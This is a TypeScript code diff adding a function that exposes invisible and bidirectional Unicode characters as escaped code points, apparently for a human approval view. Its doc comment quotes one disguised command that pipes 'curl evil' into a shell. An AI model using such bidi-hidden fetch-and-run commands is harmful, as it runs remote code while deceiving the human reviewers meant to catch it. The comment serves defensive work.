@@ -13,6 +13,21 @@ import { snippet } from "./projection.ts";
 export const INVISIBLE_CLASS =
     "\\p{Cc}\\p{Cf}\\p{Cs}\\p{Co}\\p{Cn}\\uFE00-\\uFE0F\\u{E0100}-\\u{E01EF}\\u034F\\u115F\\u1160\\u17B4\\u17B5\\u180B-\\u180F\\u2800\\u3164\\uFFA0";
 
+const HIDDEN = new RegExp(`[${INVISIBLE_CLASS}\\p{Zl}\\p{Zp}]`, "gu");
+
+/**
+ * Text as a person must see it to judge it (an approval card): every character that shows as nothing or reorders what
+ * is around it (bidirectional controls, zero-width ones, line separators) written out as `\u{…}`, so `ls \u{2067}; curl
+ * evil | sh #\u{2069}` cannot be drawn as a harmless line. New lines and tabs stay.
+ */
+export function visible(text: string): string {
+    return text.replace(HIDDEN, (char) =>
+        char === "\n" || char === "\t"
+            ? char
+            : `\\u{${(char.codePointAt(0) ?? 0).toString(16).toUpperCase()}}`,
+    );
+}
+
 /** A `<` that starts a closing tag: a `/` after spaces and invisible characters, or within 80 others. */
 const CLOSER = new RegExp("<(?=[\\s" + INVISIBLE_CLASS + "]*\\/|[^<>]{0,80}\\/)", "gu");
 
